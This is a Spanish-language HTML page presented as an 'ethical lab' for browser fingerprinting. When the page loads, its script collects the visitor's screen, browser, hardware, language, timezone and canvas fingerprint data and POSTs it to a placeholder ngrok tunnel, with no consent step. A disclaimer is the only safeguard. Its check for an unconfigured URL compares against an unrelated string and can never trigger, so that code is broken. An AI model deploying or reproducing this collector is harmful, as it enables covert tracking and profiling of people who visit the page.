<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🧪 Lab Ciberseguridad - Fingerprinting Ético</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
            color: #c9d1d9;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 20px;
            padding: 2.5rem;
            max-width: 550px;
            width: 100%;
            text-align: center;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
        }
        .emoji {
            font-size: 4rem;
            margin-bottom: 1rem;
            filter: drop-shadow(0 0 10px #58a6ff);
        }
        h1 {
            color: #58a6ff;
            margin-bottom: 0.5rem;
            font-size: 1.8rem;
        }
        .subtitle {
            color: #8b949e;
            margin-bottom: 1.5rem;
            font-size: 0.95rem;
        }
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin: 1.5rem 0;
        }
        .info-item {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 12px;
            text-align: left;
        }
        .info-label {
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: #8b949e;
            margin-bottom: 4px;
        }
        .info-value {
            font-family: 'SF Mono', 'Courier New', monospace;
            font-size: 0.9rem;
            word-break: break-word;
            color: #e6edf3;
        }
        .status-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 1.2rem;
            font-size: 0.85rem;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }
        .status-dot.connected {
            background: #3fb950;
            box-shadow: 0 0 8px #3fb950;
        }
        .status-dot.disconnected {
            background: #f85149;
            box-shadow: 0 0 8px #f85149;
        }
        .disclaimer {
            background: #1c2129;
            border: 1px solid #f0883e;
            color: #f0883e;
            padding: 10px;
            border-radius: 8px;
            font-size: 0.75rem;
            margin-top: 1.5rem;
        }
        button {
            background: transparent;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.8rem;
            margin-top: 0.8rem;
            transition: 0.2s;
        }
        button:hover {
            background: #30363d;
            color: white;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="emoji">🔬</div>
        <h1>Laboratorio Ético</h1>
        <p class="subtitle">Fingerprinting en entorno controlado</p>

        <div class="info-grid">
            <div class="info-item">
                <div class="info-label">🌐 Tu IP pública</div>
                <div class="info-value" id="ipDisplay">Consultando...</div>
            </div>
            <div class="info-item">
                <div class="info-label">📱 Navegador</div>
                <div class="info-value" id="browserDisplay">...</div>
            </div>
            <div class="info-item">
                <div class="info-label">💻 Sistema Operativo</div>
                <div class="info-value" id="osDisplay">...</div>
            </div>
            <div class="info-item">
                <div class="info-label">🖥️ Resolución</div>
                <div class="info-value" id="screenDisplay">...</div>
            </div>
        </div>

        <div class="status-container">
            <span class="status-dot" id="statusDot"></span>
            <span id="statusText">Enviando datos...</span>
        </div>
        <button onclick="location.reload();">⟳ Reenviar datos</button>

        <div class="disclaimer">
            ⚠️ Laboratorio ÉTICO. Los datos recolectados se almacenan localmente 
            en un servidor controlado solo con fines educativos.
        </div>
    </div>

    <script>
        // =====================================================
        // CONFIGURACIÓN: PON AQUÍ TU URL DE NGROK
        // Ejemplo: 'https://abc123.ngrok-free.app'
        // =====================================================
        const SERVIDOR_URL = 'https://TU-URL-DE-NGROK.ngrok-free.app';  // ← CAMBIAR ESTO

        // =====================================================
        // RECOLECCIÓN DE DATOS (Fingerprinting)
        // =====================================================
        function recolectarDatos() {
            const datos = {
                // Pantalla
                pantalla: {
                    ancho: screen.width,
                    alto: screen.height,
                    disponible: `${screen.availWidth}x${screen.availHeight}`,
                    profundidadColor: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                },
                // Navegador
                userAgent: navigator.userAgent,
                plataforma: navigator.platform || 'Desconocida',
                idioma: navigator.language || 'Desconocido',
                idiomas: navigator.languages || [],
                cookiesHabilitadas: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'no enviado',
                // Hardware
                nucleosCPU: navigator.hardwareConcurrency || '?',
                memoriaRAM: navigator.deviceMemory || '?',
                puntosTactiles: navigator.maxTouchPoints || 0,
                // Conexión
                conexion: null
            };

            // Información de red (puede no estar disponible)
            if (navigator.connection) {
                datos.conexion = {
                    tipo: navigator.connection.effectiveType || '?',
                    downlink: navigator.connection.downlink || '?',
                    rtt: navigator.connection.rtt || '?'
                };
            }

            // Zona horaria
            datos.zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
            
            // Timestamp
            datos.timestamp = new Date().toISOString();

            // Canvas fingerprint (hash simple)
            datos.canvasFingerprint = obtenerCanvasFP();

            return datos;
        }

        function obtenerCanvasFP() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 240;
                canvas.height = 60;
                
                // Dibujar formas y texto
                ctx.fillStyle = '#f60';
                ctx.fillRect(20, 10, 100, 40);
                ctx.fillStyle = '#069';
                ctx.font = 'bold 14px Arial, sans-serif';
                ctx.fillText('Lab Etico 🧪', 30, 35);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillRect(140, 20, 60, 25);
                
                // Obtener data URL y devolver longitud como hash aproximado
                const dataURL = canvas.toDataURL();
                return dataURL.length;
            } catch (e) {
                return 0;
            }
        }

        // =====================================================
        // ENVÍO DE DATOS AL SERVIDOR
        // =====================================================
        async function enviarDatos() {
            const datos = recolectarDatos();
            let exito = false;

            try {
                const respuesta = await fetch(SERVIDOR_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(datos)
                });

                if (respuesta.ok) {
                    exito = true;
                    console.log('✅ Datos enviados correctamente');
                } else {
                    console.warn('⚠️ El servidor respondió con estado:', respuesta.status);
                }
            } catch (error) {
                console.error('❌ Error de conexión con el servidor:', error.message);
            }

            actualizarEstado(exito);
        }

        function actualizarEstado(exito) {
            const dot = document.getElementById('statusDot');
            const text = document.getElementById('statusText');

            dot.className = 'status-dot ' + (exito ? 'connected' : 'disconnected');
            text.textContent = exito ? 'Datos enviados correctamente' : 'Servidor no accesible';
        }

        // =====================================================
        // MOSTRAR INFORMACIÓN LOCAL EN LA PÁGINA
        // =====================================================
        function mostrarInfoLocal() {
            // Navegador (últimas palabras del UA)
            const ua = navigator.userAgent;
            const partesUA = ua.split(' ');
            const resumenUA = partesUA.slice(-2).join(' ') || ua;
            document.getElementById('browserDisplay').textContent = resumenUA;

            // Sistema operativo
            document.getElementById('osDisplay').textContent = navigator.platform || 'Desconocido';

            // Resolución
            document.getElementById('screenDisplay').textContent = 
                `${screen.width}x${screen.height} @ ${window.devicePixelRatio}x`;
        }

        // Obtener IP pública usando servicio externo (ipify)
        async function obtenerIPPublica() {
            const elem = document.getElementById('ipDisplay');
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                if (resp.ok) {
                    const data = await resp.json();
                    elem.textContent = data.ip;
                } else {
                    elem.textContent = 'No disponible';
                }
            } catch (e) {
                elem.textContent = 'Error';
            }
        }

        // =====================================================
        // INICIALIZACIÓN
        // =====================================================
        document.addEventListener('DOMContentLoaded', () => {
            mostrarInfoLocal();
            obtenerIPPublica();
            enviarDatos();
        });

        // Verificar si se ha configurado la URL
        if (SERVIDOR_URL.includes('https://b035-170-83-127-11.ngrok-free.app -> http://localhost:8080')) {
            console.warn('⚠️ No has configurado la URL de Ngrok. Actualiza la variable SERVIDOR_URL.');
        }
    </script>
</body>
</html>
